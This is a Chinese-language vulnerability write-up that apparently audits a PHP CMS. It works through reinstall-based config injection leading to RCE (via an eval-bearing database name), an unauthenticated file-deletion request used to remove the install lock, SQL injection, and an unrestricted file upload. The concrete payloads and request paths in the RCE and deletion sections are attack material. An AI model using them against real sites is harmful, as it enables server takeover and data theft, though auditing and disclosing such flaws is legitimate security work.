## **开始**

日常打开fofa， 确认目标后，右键检查页面源代码。没有版权信息无法确认是哪个cms. 确定特征值后再fofa(**这样找到源码的记录会大大提升**) ，翻来翻去, 找到了疑似官方演示站点.  
![](../Images/808fc54c71353f64d5e7e67d511ad58e.png)

进行子域名收集, 收集到三个子域名

![](../Images/e1a7a82a024ed50f8c1d0fa2e0e25f33.png)

先翻一翻. 在开源信息页面找到了项目提供的源码地址.

![](../Images/792aaa63a1be87e462838cd7a32cd1c5.png)

## **V1重复安装覆写配置文件导致RCE**

该cms用了低版本的 `mysql_connect` 语法. 我这里的PHP用了 `5.4.45`, 搭建好后不会自动跳转到安装页面. 只能手动跳转 `/install/`。

![](../Images/2121ca7f633c9cdbcb5eefc3d79d9566.png)

正常安装一遍后, 我刷新页面. 再次进入了安装选项页面，可以再安装一次. 开始分析源码。

![](../Images/a14eda1ccdda71248692b3ffaaba0e03.png)

看源码是有安装检测的. 但这个文件我却没找到， 目录中根本没有`source`文件夹.

![](../Images/8bafbb086e47d37f94af6e5f922ca227.png)

获取到参数时，只是简单删除前后空字符. 没有验证消毒等操作(往后也没有)。

![](../Images/199728a3e5b2e6299cedcd03c0a8dedc.png)

整个配置文件内容定义在 `$config_contents` 变量中( `<?php return array(); ?>` ), 参数也只是普通的字符串拼接起来, **参数可控，如果能逃逸就rce了**。

![](../Images/05d64166dbf6efdb6ba4e8fe724a94b7.png)

这里选择从数据库名称`$dbname`下手, 服务器连接地址, 数据库用户名密码不好用特殊字符， 而数据库会检测是否存在如果不存在就会创建, 但是创建数据库这里也没法使用特殊字符.

![](../Images/d142b9a26794b05f7de1c8b5b8aab3d8.png)

除非数据库名称用反引号包裹

```
1.  ``create datab ase `datab ase name`;``
    
2.  ``create datab ase `test'1`;``
    
```

**准备一个远程 `**mysql**`服务器, 创建好特殊名称的数据库. 然后重新安装站点**

```
1.  ``CREATE DATAb ase `'.e val($_GET[333])//`;``
    
```

![](../Images/c11e6156d4adb1ba74551fea418d6cd9.png)

安装成功.

![](../Images/b098673337ffa6a5f4ded6ef53cb4d7e.png)

打开页面，`_mkdir()`方法未定义

![](../Images/e16f6899ca0f984fcf9d43b24d2f5664.png)

非常幸运, `_mkdir()`的调用，在 `e val`的后面.

![](../Images/821d5ae91748155919f165f01a2a492c.png)

跳转到定义函数, 复制函数的定义的语法就好了. 不用复制函数内容

![](../Images/7fb62095dd299de50de7b590e60078c4.png)

payload 如下.

```
1.  `function _mkdir($dir,$mode=0777){};system('whoami');`
    
```

![](../Images/a51ee20370170ec3a8c2a73d6ba58a91.png)

## **V2任意文件删除漏洞+安装覆写配置文件导致RCE**

### **配置文件覆写导致RCE**

初打开页面后是个报错. 丢失`Config.php`盲猜是没有安装所以没有生成该文件.

![](../Images/3dd7feda025f206a406a6c960ded81d2.png)

手动跳转 `/install/`, 这次有安装检测了. 安装的话需要先删除`install`目录下的`lock`文件

![](../Images/5a606030a9f076e391f2f34d49be3841.png)

打开`/install/index.php`， `write_config()`是写入配置的函数. 依旧是没有进行任何过滤消毒. 和`V1`不同的是他这次不采用字符串拼接的方式了. 而是使用替换, 配置文件的目录改为`/ERP/Config/Config.php`了。

![](../Images/89bba249587a8081ffde4cb00486beec.png)

看一下文件模板`/install/data/config.php`，虽然改成替换字符. 但没有验证消毒等操作. 问题还是存在的

![](../Images/5fbcfe4492fe77f255ec7ce52d833ce5.png)

而且在 `/install/index.php` 111行中创建数据库的语句加上了 反引号， **输入特殊字符也能执行成功. 不需要提前准备数据库了**

![](../Images/03bee5189cb57377d550da91901197d4.png)

删除`/install/lock`文件, 尝试安装, 验证是否存在漏洞

![](../Images/83cb91fcd705e5a378f156ff1f23c7ef.png)

使用和V1同样的payload, 成功执行

![](../Images/f3bf8fe987e24ec7d7e3fd7b58277618.png)

这时如果有办法删除`/install/lock`文件, 就可以无条件RCE了

### **任意文件删除漏洞**

全局搜索`unlink`由是这个`Upload.class.php`, 可以看到只是拼接了一个 `.` 而非`./`，所以并没有做到对路径的限制.

![](../Images/f1d6a8959a1c56f6cd78179ee2263bce.png)

跟进 `_REQUEST()`方法, 够方便的…，如果`GET`中没有数据, 那就在`POST`中拿数据.

![](../Images/7d0aa583247c67e71c794b2822d005b9.png)

跟进`unlink_file()`方法, 还是没有对参数进行验证，简单判断文件是否存在就执行`unl ink()`删除文件了

![](../Images/599a673203772bbe09e63c0235534861.png)

`dir_replace()`方法只是修理一下目录分割符.

![](../Images/9983ade21ea01d4162fc6dc407759fe7.png)

尝试访问`index.php/Upload/upload_img_remove/`, 存在未授权访问. 报错是因为没法删除 `.`,

![](../Images/5fa7be7090cb896bcff0b4faf57655ec.png)

### **组合RCE**

访问`/index.php/Upload/upload_img_remove/?imgfile=/install/lock`, 成功删除`/install/lock`文件

![](../Images/12ef0d35ff2583e289d9f52586166005.png)

再次访问`/install/`, 成功进入安装界面.

![](../Images/d5e8f224a0793fa4361eb36ebc93523f.png)

再次安装站点，和`V1`一样的数据库名称. 但这次不需要自己创建了.

![](../Images/432ffcea1dcea886ff5fd3dc5bd34a56.png)

成功.  
![](../Images/4280c46de55d0665efc42fa34c7f5a72.png)

## **(V1、V2)SQL注入漏洞（同一个数据库抽象类）**

整个cms, SQL语句和参数几乎都是用字符串拼接的. 而且是拿到参数后直接拼接. 没有任何验证消毒等操作.

![](../Images/214bd2af36a4558fc69cc3b5c2b0b4cf.png)

跟进`Framk/Datab ase.class.php->Datab ase->findAll()`方法, 使用了`PDO`，但同样都没有过滤直接将拼接好的SQL语句去执行,

![](../Images/cfaafff0bf7a767fcffe62c13fa54d76.png)

![](../Images/0aa037b9c8877f7d2ee3a737d6f4554c.png)  
直接就可以用sqlmap打穿. 密码还是明文存储的.

![](../Images/272b0c6e9e0609eeedf34517df48c695.png)

## **(V1、V2)未授权访问任意文件上传漏洞（同一个基类）·**

全局搜索`move_uploaded_file`发现了, `Crm/Action/Upload.class.php->Upload->upload_img_save()`. 他分离了文件名和后缀名并没有验证. 而是重新生成文件名后拼接原本的文件后缀. 121行的 `$pictype` 也没有进行验证.

![](../Images/05f3b1c61a2e58ed484a9ae5a3298c2e.png)

根据他的路由习惯, 直接访问 `/index.php/Upload/upload_img_save/`，直接为我们写好了html

![](../Images/332b7eefe6139e8c3e81a291231d8983.png)

上传个`phpinfo()`，试一下. 上传成功后路径有回显

![](../Images/85b4ab59a03fcd3fcc922a388231a5bd.png)

成功解析.

![](../Images/b48c5663c1fec19071e08dd037e8b0f5.png)
